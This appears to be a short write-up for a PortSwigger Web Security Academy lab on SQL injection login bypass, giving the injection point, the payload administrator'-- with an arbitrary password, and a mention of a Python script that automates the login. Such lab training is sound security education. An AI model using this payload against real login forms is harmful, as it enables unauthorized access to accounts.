# Manual Solution Using Burp Suite Community

## Lab

**SQL injection vulnerability allowing login bypass**

> **Note:** Replace the lab URL below with your own PortSwigger Web Security Academy lab instance.

### Login Page

```text
https://0ab5006d039f724080322bd800e400e7.web-security-academy.net/login
```

### Injection Point

```text
username
```

### Payload

```sql
administrator'--
```

### Password

```text
anything
```

### Result

Submit the login request with the following values:

| Parameter | Value |
|----------|-------|
| username | `administrator'--` |
| password | `anything` |

The SQL comment (`--`) ignores the password check, allowing you to authenticate as the `administrator` user.

---

## Python Implementation

The accompanying Python script:

- Retrieves the CSRF token.
- Submits the login request with the SQL injection payload.
- Authenticates as the `administrator` user.

```text
login-bypass.py
```
